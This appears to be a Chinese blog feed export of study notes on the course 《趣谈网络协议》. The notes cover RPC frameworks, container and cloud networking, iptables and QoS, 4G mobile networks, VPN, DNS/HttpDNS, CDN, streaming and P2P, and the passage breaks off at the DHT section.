    <title>《趣谈网络协议》学习总结：32-36讲</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A32-36%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A32-36%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="RPC协议："><a href="#RPC协议：" class="headerlink" title="RPC协议："></a>RPC协议：</h3><p>1、协议约定问题：最早的 RPC 的一种实现方式称为 Sun RPC 或 ONC RPC。这个 RPC 框架是在 NFS 协议中使用的。服务端和客户端都是以RPCRuntime收发请求，使用Stub解码。通过框架规定远程调用的语法、传递参数和数据表示；<br>2、传输问题：使用ONC RPC类库，处理连接失败、重试、发送失败、超时等场景；<br>3、服务发现问题：ONC RPC中，通过portmapper进行服务发现。RPC程序启动时，会向port mapper注册，客户端访问服务时，先查询portmapper，获取RPC服务端口，再建立连接，发起调用。</p><h3 id="基于XML的SOAP（简单对象访问）协议："><a href="#基于XML的SOAP（简单对象访问）协议：" class="headerlink" title="基于XML的SOAP（简单对象访问）协议："></a>基于XML的SOAP（简单对象访问）协议：</h3><p>原来的二进制 RPC 有很多缺点，格式要求严格，修改过于复杂，不面向对象，于是产生了基于文本的调用方式——基于 XML 的 SOAP。<br>SOAP 有三大要素：协议约定用 WSDL、传输协议用 HTTP、服务发现用 UDDL。</p><h3 id="基于JSON的RESTful接口协议："><a href="#基于JSON的RESTful接口协议：" class="headerlink" title="基于JSON的RESTful接口协议："></a>基于JSON的RESTful接口协议：</h3><p>RESTful 不仅仅是一个 API，而且是一种架构模式，主要面向资源，提供无状态服务，有利于横向扩展应对高并发。<br>基于 RESTful API 的跨系统调用框架Spring Cloud就是使用Eureka进行服务注册发现的。</p><h3 id="二进制类RPC协议-dubbo："><a href="#二进制类RPC协议-dubbo：" class="headerlink" title="二进制类RPC协议-dubbo："></a>二进制类RPC协议-dubbo：</h3><p>Dubbo用于提示服务间调用的性能。 通过注册中心解决服务发现问题，通过 Hessian2 序列化解决协议约定的问题，通过 Netty 解决网络传输的问题。<br>1、Dubbo 中默认的 RPC 协议是 Hessian2。为了保证传输的效率，Hessian2 将远程调用序列化为二进制进行传输，并且可以进行一定的压缩。<br>2、Netty 是一个非阻塞的基于事件的网络传输框架，在服务端启动的时候，会监听一个端口，并注册一些连接和请求时间。</p><h3 id="跨语言类RPC协议："><a href="#跨语言类RPC协议：" class="headerlink" title="跨语言类RPC协议："></a>跨语言类RPC协议：</h3><p>GRPC 是一种二进制，性能好，跨语言，还灵活，同时可以进行服务治理的多快好省的RPC 框架，唯一不足就是还是要写协议文件。<br>GRPC 序列化使用 Protocol Buffers，网络传输使用 HTTP 2.0，服务治理可以使用基于Envoy 的 Service Mesh。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>RPC协议</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：28-31讲</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A29-31%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A29-31%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="容器网络："><a href="#容器网络：" class="headerlink" title="容器网络："></a>容器网络：</h3><p>环境隔离技术：1）命名空间（namespace）；2）机制网络（cgroup）<br>命名空间（namespace）：每个namespace 中的应用看到的是不同的 IP 地址、用户空间、程号等。<br>机制网络（cgroup）：cgroup 全称 control groups，是 Linux 内核提供的一种可以限制、隔离进程使用的资源机制。包含很多子系统：<br>CPU 子系统使用调度程序为进程控制 CPU 的访问；<br>cpuset，如果是多核心的 CPU，这个子系统会为进程分配单独的 CPU 和内存；<br>memory 子系统，设置进程的内存限制以及产生内存资源报告；<br>blkio 子系统，设置限制每个块设备的输入输出控制；<br>net_cls，这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制<br>程序（tc）识别从具体 cgroup 中生成的数据包。</p><h4 id="容器与宿主机通信："><a href="#容器与宿主机通信：" class="headerlink" title="容器与宿主机通信："></a>容器与宿主机通信：</h4><p>在 Linux 下，可以创建一对 veth pair 的网卡，一端绑定docker网桥，一段绑定namespace，实现通信；</p><h4 id="容器访问外网："><a href="#容器访问外网：" class="headerlink" title="容器访问外网："></a>容器访问外网：</h4><p>NAT模式：SNAT</p><h4 id="外网访问容器服务："><a href="#外网访问容器服务：" class="headerlink" title="外网访问容器服务："></a>外网访问容器服务：</h4><p>1）docker-proxy：比如监听10080端口，转换为80端口<br>2）DNAT：在 -A PREROUTING 阶段加一个规则，将到端口 10080的 DNAT 称为容器的私有网络。</p><h3 id="跨节点容器网络方案——flannel："><a href="#跨节点容器网络方案——flannel：" class="headerlink" title="跨节点容器网络方案——flannel："></a>跨节点容器网络方案——flannel：</h3><p>基于 NAT 的容器网络模型在微服务架构下有两个问题，一个是 IP 重叠，一个是端口冲突，需要通过 Overlay 网络的机制保持跨节点的连通性。<br>flannel使用UDP实现Overlay：<br>每一台物理机上运行一个flannel进程，创建出一个flannel.1网卡，所有发到该网卡的包会被flannel进程封装在UDP包里，外层加上源、目物理机IP，发送给目的物理机上的flannel进程处理，拆封UDP包，通过目的物理机的flannel.1网卡发送出去。由于是用户态对数据包进行封装，会有性能损耗。<br>flannel使用VXLAN实现Overlay：<br>通过内核netlink机制创建一个VTEP网卡flannel.1，物理机A将数据包发送到flannel.1进行封装，转发到物理机B的flannel.1网卡进行解包，变成内部网络包，再通过物理机网桥转发到容器B内部； VXLAN 在内核态封装， 性能更好一些。</p><h3 id="容器网络——Calico："><a href="#容器网络——Calico：" class="headerlink" title="容器网络——Calico："></a>容器网络——Calico：</h3><p>设计思路：不依赖Overlay网络，不引入额外的网络损耗，利用物理机做路由器，使用三层网络的路由转发实现容器间通信。<br>Calico组件：<br>路由配置组件：每台物理机上有一个 agent，当创建和删除容器的时候，配置一条指向该容器的路由。这个 agent 在 Calico 中称为 Felix。<br>路由广播组件BGP Speaker：将该节点的路由信息进行广播；<br>安全策略组件：控制任意容器网络的连通；<br>BGP Route Reflector：节点数多时，为降低网络复杂性，BGP Speaker会直连一个BGP Route Reflector，让它负责广播全网路由信息；规模更大时，使用多个 BGP Router Reflector，每个 BGP Router Reflector 管一部分，服务器和 BGP Router Reflector 之间使用的是数据中心内部的路由协议 iBGP，BGP Router Reflector 之间使用的是数据中心之间的路由协议 eBGP。<br>跨网段访问问题：Calico的IPIP模式，在两台物理机直接建立隧道，容器IP作为乘客协议放在隧道内，物理机IP作为承载协议。不管外层的 IP 通过传统的物理网络，走多少跳到达目标物理机，从隧道两端看起来，物理机 A 的下一跳就是物理机 B，从而实现了容器网络的跨网段访问。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>容器网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：26-28讲</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A26-28%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A26-28%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="网络传输节点："><a href="#网络传输节点：" class="headerlink" title="网络传输节点："></a>网络传输节点：</h3><h4 id="当一个数据包进入一台设备的时候，会经历一下5个节点："><a href="#当一个数据包进入一台设备的时候，会经历一下5个节点：" class="headerlink" title="当一个数据包进入一台设备的时候，会经历一下5个节点："></a>当一个数据包进入一台设备的时候，会经历一下5个节点：</h4><p>1）prerouting：路由判断前；2）input：IP与本地匹配，数据包传入传输层；3）forward：IP不匹配，转发数据包；4）output：传输层（上层）处理后返回处理结果；5）postrouting：路由判断后的节点（forward，output节点之后）<br>Netfilter：在上述节点插入hook函数，干预数据包传输（接收、丢弃、发送给用户态进程处理）；linux内核模块ip_tables就是依赖该框架实现；<br>iptables：客户端程序，使用命令行干预内核ip_tables规则；具备表和链的概念；<br>iptables表：raw-mangle-nat-filter<br>filter表：处理过滤功能，主要包含三个链：1）input链：过滤所有目标地址是本机的数据包；2）forward链：过滤所有经过本机的数据包；3）output链：过滤所有本机产生的数据包；<br>nat表：主要是处理网络地址（源、目）转换，包含三个链：1）prerouting链：在数据包到达防火墙时改变目标地址；2）output链：改变本机产生的数据包的目标地址；3）postrouting链：在数据包离开防火墙时更改数据包源地址；<br>mangle表：主要是修改数据包，包含prerouting链、input链、forward链、output链、postrouting链；</p><h3 id="QoS（服务质量）控制："><a href="#QoS（服务质量）控制：" class="headerlink" title="QoS（服务质量）控制："></a>QoS（服务质量）控制：</h3><p>Linux可通过TC控制网络的QoS，主要通过队列方式</p><h3 id="无类别排队规则："><a href="#无类别排队规则：" class="headerlink" title="#无类别排队规则："></a>#无类别排队规则：</h3><p>1.1、pfifo_fast技术，分为三个队列（Band），具备优先级，根据网络包里的TOS，判断进入的队列，处于优先级高的队列优先发送；<br>1.2、随机公平队列：建立很多的 FIFO 的队列，TCP Session 会计算 hash 值，通过 hash 值分配到某个队列。在队列的另一端，网络包会通过轮询策略从各个队列中取出发送。这样不会有一个 Session 占据所有的流量<br>1.3、令牌桶规则（TBF）：所有的网络包排成队列，拿到令牌才能发送。令牌根据设定的速度生成，即便队列很长，也是按照一定的速度进行发送的，令牌也不无限生成，令牌桶放满即不再生成，防止令牌大量积累，出现流量激增。</p><h4 id="基于类别的队列规则："><a href="#基于类别的队列规则：" class="headerlink" title="基于类别的队列规则："></a>基于类别的队列规则：</h4><p>2.1、分层令牌桶规则（HTB）：TC 可以为某个网卡 eth0 创建一个 HTB 的队列规则，然后对该root创建分支，每个分支有固定的两个发送速度；同一个 root 下的子类（分支）可以相互借流量，不浪费带宽；<br>云中网络 Openvswitch 中，主要使用的是分层令牌桶规则（HTB），将总的带宽在一棵树上按照配置的比例进行分配，并且在一个分支不用的时候，可以借给另外的分支，从而增强带宽利用率</p><h3 id="云中的网络隔离："><a href="#云中的网络隔离：" class="headerlink" title="云中的网络隔离："></a>云中的网络隔离：</h3><p>Underlay网络：底层的物理网络设备组成的网络；<br>Overlay网络：基于物理网络的虚拟化网络实现；</p><h4 id="Overlay技术一：GRE（-Generic-Routing-Encapsulation）："><a href="#Overlay技术一：GRE（-Generic-Routing-Encapsulation）：" class="headerlink" title="Overlay技术一：GRE（ Generic Routing Encapsulation）："></a>Overlay技术一：GRE（ Generic Routing Encapsulation）：</h4><p>将IP包封装在GRE包里，外部再加上IP头，形成一个虚拟的点对点的连接隧道，由具备路由功能的设备如路由器进行封装、解封数据包；<br>GRE缺点：1）GRE是点对点隧道，每个虚拟网络间需要建立一个隧道，隧道数目随网络数呈指数增长；2）GRE不支持组播，GRE会将广播帧广播到所有与该节点有隧道连接的节点；3）很多防火墙和三层网络设备无法解析GRE；</p><h4 id="Overlay技术二：VXLAN："><a href="#Overlay技术二：VXLAN：" class="headerlink" title="Overlay技术二：VXLAN："></a>Overlay技术二：VXLAN：</h4><p>VXLAN封装的是二层数据帧，在二层外封装一个VXLAN头，包含24位VXLAN ID，在VXLAN头部外还封装了UDP、IP、MAC头部；<br>VTEP（VXLAN Tunnel Endpoint）：实现封装和解封VXLAN数据包的节点称为VTEP；VTEP通过组播定位目标机器，不是点对点；<br>OpenvSwitch 支持三类隧道：GRE、VXLAN、IPsec_GRE。在使用 OpenvSwitch 的时候，虚拟交换机就相当于 GRE 和 VXLAN 封装的端点。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>云中网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：23-25讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="移动网络："><a href="#移动网络：" class="headerlink" title="移动网络："></a>移动网络：</h3><h4 id="2G时代上网："><a href="#2G时代上网：" class="headerlink" title="2G时代上网："></a>2G时代上网：</h4><p>1）手机通过无线信号连接基站；2）基站一面接无线，一面接核心网；3）核心网一面接基站请求，判断是否合法等，一面通过网关接电话网络；</p><h4 id="2-5G网络："><a href="#2-5G网络：" class="headerlink" title="2.5G网络："></a>2.5G网络：</h4><p>在2G的网络基础上加入了分组交换业务；在基站接核心网的组件中，多了分组控制端元，提供分组交换通道；在核心网里面，有个朝前的接待员（SGSN，Service GPRS Supported Node）和朝后连接IP 网络的网关型 GPRS 支持节点（GGSN，Gateway GPRS Supported Node）。</p><h4 id="3G网络："><a href="#3G网络：" class="headerlink" title="3G网络："></a>3G网络：</h4><p>主要是增加了无线的带宽</p><h4 id="4G网络："><a href="#4G网络：" class="headerlink" title="4G网络："></a>4G网络：</h4><p>手机直接通过 eNodeB 连接 SGW，连上核心网，SGW 相当于数据面的接待员，并通过PGW 连到 IP 网络。PGW 就是出口网关。在出口网关，有一个组件 PCRF，称为策略和计费控制单元，用来控制上网策略和流量的计费。</p><h3 id="4G网络协议-控制面协议："><a href="#4G网络协议-控制面协议：" class="headerlink" title="4G网络协议-控制面协议："></a>4G网络协议-控制面协议：</h3><p>一个手机想上网的时候，先要连接 eNodeB，并通过 S1-MME 接口，请求 MME 对这个手机进行认证和鉴权。eNodeB和MME之间使用SCTP协议进行通信。SCTP特点：1）多宿主，引入联合的概念，将多个接口、多条路径放到一个联合中来。当检测到一条路径失效时，协议就会通过另外一条路径来发送通信数据，从而使一台机器支持多个网卡；2）将一个联合分成多个流，一个联合中的所有流都是独立的，但均与该联合相关。每个流都给定了一个流编号，它被编码到 SCTP 报文中，通过联合在网络上传送。3）四次握手，引入cookie概念，防止SYN攻击；4）消息分帧，SCTP 借鉴了 UDP 的机制，在数据传输中提供了消息分帧功能。当一端对一个套接字执行写操作时，可确保对等端读出的数据大小与此相同；5）断开连接是三次挥手，当一端关闭连接时，两端都需关闭。</p><h3 id="4G网络协议-数据面协议："><a href="#4G网络协议-数据面协议：" class="headerlink" title="4G网络协议-数据面协议："></a>4G网络协议-数据面协议：</h3><p>数据面的协议都是通过 GTP-U，分为乘客协议、隧道协议、承载协议。其中乘客协议是手机发出来的包，IP 是手机的 IP，隧道协议里面有隧道 ID，不同的手机上线会建立不同的隧道，因而需要隧道 ID 来标识。承载协议的 IP 地址是 SGW 和 PGW 的 IP 地址。</p><h3 id="手机上网过程："><a href="#手机上网过程：" class="headerlink" title="手机上网过程："></a>手机上网过程：</h3><p>1）寻找并发送Attach Request给附近基站eNodeB；2）eNodeB 将请求发给 MME；3）MME 去请求手机，一是认证，二是鉴权，还会请求 HSS 看看有没有钱，看看是在哪里上网；4）认证通过，MME请求SGW创建会话、分配隧道；5）SGW请求PGW创建会话、分配隧道；6）PGW答复，并创建隧道，标记手机请求；7）SGW回复MME会话创建完成，回复隧道ID；8）MME回复eNodeB隧道创建完成，回复隧道ID；9）eNodeB回复MME，自身分给SGW的隧道ID；10）MME 将 eNodeB 给 SGW 分配的隧道 ID  告知 SGW，从而前面的隧道也建设完毕。</p><h3 id="异地上网问题："><a href="#异地上网问题：" class="headerlink" title="异地上网问题："></a>异地上网问题：</h3><p>异地上网时，手机请求附近的eNodeB，并通过MME去查询国内运营商的HSS，验证用户信息，如果验证通过，手机会与异地的SGW建立隧道，异地的SGW再与国内运营商的PGW建立隧道，由PGW内的PCRF组件计算上网流量，控制上网策略。因此异地上网时，上网策略还是由国内运营商控制的。</p><h3 id="虚拟网卡："><a href="#虚拟网卡：" class="headerlink" title="虚拟网卡："></a>虚拟网卡：</h3><p>通过Linux上的TUN/TAP技术实现<br>###虚拟机间通信：<br>在Linux 上通过 brctl命令创建虚拟的网桥 brctl addbr br0。再将两个虚拟机的虚拟网卡，都连接到虚拟网桥 brctladdif br0 tap0 上，这样将两个虚拟机配置相同的子网网段，两台虚拟机就能够相互通信。 虚拟机访问外部：1）桥接：虚拟机和物理机网卡连接在同一个网桥上，使用同一网段，和物理机使用同一个DHCP等服务器；解决了虚拟机间、虚拟机和外部的通信问题，但同一子网内设备过多会引发广播问题；2）NAT：物理机会创建虚拟的DHCP服务器和独立的网桥br0，虚拟机要想访问互联网，需要通过 br0 连到路由器上，然后通过路由器将请求 NAT 成为物理网络的地址，转发到物理网络。<br>虚拟机隔离问题：基于物理网卡，为每个用户用 vconfig 创建一个带 VLAN 的网卡。不同的用户使用不同的虚拟网桥，带 VLAN 的虚拟网卡也连接到虚拟网桥上。</p><h3 id="SDN（软件定义网络）："><a href="#SDN（软件定义网络）：" class="headerlink" title="SDN（软件定义网络）："></a>SDN（软件定义网络）：</h3><p>OpenFlow 是 SDN 控制器和网络设备之间互通的南向接口协议，OpenvSwitch 用于创建软<br>件的虚拟交换机。OpenvSwitch 是支持 OpenFlow 协议的，当然也有一些硬件交换机也支持<br>OpenFlow 协议。它们都可以被统一的 SDN 控制器管理，从而实现物理机和虚拟机的网络连<br>通。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>移动网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：21-22讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="数据中心："><a href="#数据中心：" class="headerlink" title="数据中心："></a>数据中心：</h3><p>1、边界路由器（Border Router）：数据中心的入口和出口也是路由器，由于在数据中心的边界，称为边界路由器（Border Router），边界路由器会连接多个运营商网络。<br>2、网卡绑定：多个网卡、多个网线利用LACP（Link Aggregation Control Protocol）协议聚合成一个网卡、一个网线。<br>3、交换机高可用方式：1）使用STD协议连接，形成主备；2）利用堆叠技术，将多个交换机形成一个逻辑交换机，接入层交换机多根线分别连接到多个交换机上，并且通过堆叠的私有协议，形成双活的连接方式。<br>4、可用区：汇聚层将大量的计算节点相互连接在一起，形成一个集群。在这个集群里面，服务器之间通过二层互通，这个区域常称为一个 POD（Point Of Delivery）；<br>5、核心交换机：连接多个可用区的交换机。<br>6、二层设备高可用技术：TRILL（Transparent Interconnection of Lots of Link），即多链接透明互联协议。运行 TRILL 协议的交换机称为 RBridge，是根据mac进行路由转发的网桥设备，可计算最短路径，也可通过等价路由方式进行负载均衡和高可用。</p><h3 id="VPN："><a href="#VPN：" class="headerlink" title="VPN："></a>VPN：</h3><p>VPN，全名 Virtual Private Network，虚拟专用网，就是利用开放的公众网络，建立专用数据传输通道，将远程的分支机构、移动办公人员等连接起来。<br>VPN 通过隧道技术在公众网络上仿真一条点到点的专线，涉及三种协议：乘客协议、隧道协议和承载协议。<br>IPsec VPN，基于 IP 协议的安全隧道协议。具备私密性、完整性、真实性的机制；通过预共享密钥或数字签名的方式确认通信方身份。<br>IKE组件：进行密钥交换；<br>SA组件：进行连接维护；<br>IPsec VPN建立过程：1）使用DH算法计算出对称密钥K；2）建立 IPsec SA，在这个 SA 里面，双方会生成一个随机的对称密钥 M，由 K 加密传给对方，然后使用 M 进行双方接下来通信的数据。对称密钥M具有时效性；IPsec SA 里面有以下内容：<br>SPI（Security Parameter Index），用于标识不同的连接；<br>双方商量好的加密算法、哈希算法和封装模式；<br>生存周期，超过这个周期，就需要重新生成一个 IPsec SA，重新生成对称密钥</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>数据中心</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：18-20讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="DNS全局负载均衡过程："><a href="#DNS全局负载均衡过程：" class="headerlink" title="DNS全局负载均衡过程："></a>DNS全局负载均衡过程：</h3><p>1、如客户端访问某域名时（example.com），会先请求本地DNS解析器，本地DNS解析器会查看本地缓存是否有该域名的记录，有则直接使用，无则请求本地DNS服务器；<br>2、本地DNS服务器一般部署在数据中心或者所在运营商网络中，本地DNS服务器查看是否有缓存，若无缓存，则请求根DNS服务器；<br>3、根DNS服务器解析会，会提供管理.com域名的顶级域名服务器地址，本地DNS服务器继续请求该地址；<br>4、顶级域名服务器解析后，则提供管理example.com的权威域名服务器地址，本地DNS服务器继续请求该地址；<br>5、在example.com的权威域名服务器中，一般会以CNAME的方式配置example.com的别名，然后让本地DNS服务器请求GSLB解析这个别名，GSLB 就可以在解析这个域名的过程中，通过自己的策略实现负载均衡，返回给客户端对应的IP地址。</p><h3 id="传统DNS存在的问题："><a href="#传统DNS存在的问题：" class="headerlink" title="传统DNS存在的问题："></a>传统DNS存在的问题：</h3><p>1、域名缓存问题；2、域名转发问题；3、域名更新问题；4、解析延迟问题</p><h3 id="HttpDNS的工作模式："><a href="#HttpDNS的工作模式：" class="headerlink" title="HttpDNS的工作模式："></a>HttpDNS的工作模式：</h3><p>HttpDNS往往在移动端使用，客户端的SDK动态的请求服务端，获取HttpDNS服务器的IP列表缓存在本地，当手机要请求一个网址时，会优先使用本地缓存，若本地无对应缓存，则请求HttpDNS服务器，由服务器返回要访问的网站的IP列表</p><h3 id="HttpDNS的缓存设计："><a href="#HttpDNS的缓存设计：" class="headerlink" title="HttpDNS的缓存设计："></a>HttpDNS的缓存设计：</h3><p>HttpDNS 的缓存设计策略分为客户端、缓存、数据源三层。对应手机客户端、DNS缓存、HttpDNS服务器。<br>客户端SDK中的缓存会严格按照缓存过期时间，如果缓存未命中或过期，会发起一次解析，保障记录是最新的；<br>解析分为同步和异步两种方式：</p><h4 id="1、同步解析："><a href="#1、同步解析：" class="headerlink" title="1、同步解析："></a>1、同步解析：</h4><p>直接调用 HttpDNS 的接口，返回最新的记录，更新缓存；优点是实时性好；缺点是如果有多个请求都发现过期的时候，同时会请求HttpDNS 多次，造成资源浪费；<br>同步更新的方式对应到应用架构中缓存的 Cache-Aside 机制，也即先读缓存，不命中读数据库，同时将结果写入缓存。</p><h4 id="2、异步解析："><a href="#2、异步解析：" class="headerlink" title="2、异步解析："></a>2、异步解析：</h4><p>添加一个解析任务到后台，由后台任务调用 HttpDNS 的接口；优点是，可以将多个请求都发现过期的情况，合并为一个对于 HttpDNS 的请求任务，只执行一次，减少 HttpDNS 的压力。同时可以在即将过期的时候，就创建一个任务进行预加载，防止过期之后再刷新，称为预加载；缺点是当前请求拿到过期数据的时候，如果客户端允许使用过期数据，则存在过期数据不能访问风险。<br>异步更新的机制对应到应用架构中缓存的 Refresh-Ahead 机制，即业务仅仅访问缓存，当过期的时候定期刷新。</p><h3 id="HttpDNS调度设计："><a href="#HttpDNS调度设计：" class="headerlink" title="HttpDNS调度设计："></a>HttpDNS调度设计：</h3><p>1、在客户端，客户端的SDK会收集手机的位置、运营商、网络情况等信息，HttpDNS 服务端根据这些信息，选择最佳的服务节点返回。<br>2、在服务端，应用可以通过调用 HttpDNS 的管理接口，配置不同服务质量的优先级、权重。HttpDNS 会根据这些策略综合地理位置和线路状况算出一个排序，优先访问当前那些优质的、时延低的 IP 地址。</p><h3 id="CDN（内容分发网络）："><a href="#CDN（内容分发网络）：" class="headerlink" title="CDN（内容分发网络）："></a>CDN（内容分发网络）：</h3><p>CDN加速意思就是在用户和我们的服务器之间加一个缓存机制，通过这个缓存机制动态获取IP地址根据地理位置，让用户到最近的服务器访问。<br>CDN系统能实时的根据网络流量和各节点的连接，负载状况及用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，其目的是使用户能就近的获取请求数据，解决网络拥堵，提高访问速度，解决由于网络带宽小，用户访问量大，网点分布不均等原因导致的访问速度慢的问题。</p><h3 id="CDN分发过程："><a href="#CDN分发过程：" class="headerlink" title="CDN分发过程："></a>CDN分发过程：</h3><p>用户向浏览器提供需要访问的域名；</p><p>浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际的IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析。如根据地理位置信息解析对应的IP地址，使得用户能就近访问；</p><p>此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的ip地址之后，向缓存服务器发出访问请求；</p><p>缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求；</p><p>缓存服务器从实际IP地址得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据放回给客户端，完成数据服务过程；</p><p>客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程。</p><h3 id="动态CDN："><a href="#动态CDN：" class="headerlink" title="动态CDN："></a>动态CDN：</h3><p>1、边缘计算模式：定时从源数据那里同步存储的数据，然后在边缘进行计算得到结果。<br>2、路径优化模式：数据的计算在源站生产，数据下发通过CDN网络，并对路径进行优化.</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>DNS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：16-17讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="流媒体协议"><a href="#流媒体协议" class="headerlink" title="流媒体协议"></a>流媒体协议</h3><p>视频有客户端上传至服务器在由另一客户端下载播放的流程大致如下：客户端（采样、编码、推流）-服务器（接流、流处理、分发）-客户端（拉流、解码、播放）<br>视频传输过程中，数据量过大，需要进行压缩处理；常用的对视频流中图片的压缩方法有1、空间冗余；2、时间冗余；3、视觉冗余；4、编码冗余。<br>完整的视频流由很多帧图片组成，每一帧又分成多个片，每个片的信息都使用一个网络提取层单元（NALU）保存，最终组成一个NALU序列，为传输做准备<br>排列好的二进制流需要使用基于TCP的RTMP协议进行分块传输<br>当视频流推送到客户端时，客户端再通过RTMP协议拉取数据，读取chunk中的message，组合为NALU序列，再解码成视频格式播放</p><h3 id="P2P协议"><a href="#P2P协议" class="headerlink" title="P2P协议"></a>P2P协议</h3><p>下载一个文件有HTTP和FTP两种方式，但这两种都是集中下载的方式，而 P2P 则换了一种思路，采取非中心化下载的方式；<br>P2P 两种，一种是依赖于 tracker 的，也即元数据集中，文件数据分散；另一种是基<br>于分布式的哈希算法，元数据和文件数据全部分散。<br>依赖tracker ：<br>下载时，BT 客户端首先解析.torrent 文件得到 tracker 地址，再由 tracker 服务器将其他下载者（包括发布者）的 IP 提供给下载者。下载者再连接其他下载者，根据.torrent 文件，两者分别对方告知自己已经有的块，然后交换对方没有的数据。此时不需要其他服务器参与，并分散了单个线路上的数据流量，因此减轻了服务器的负担。</p><h3 id="去中心化网络（DHT）："><a 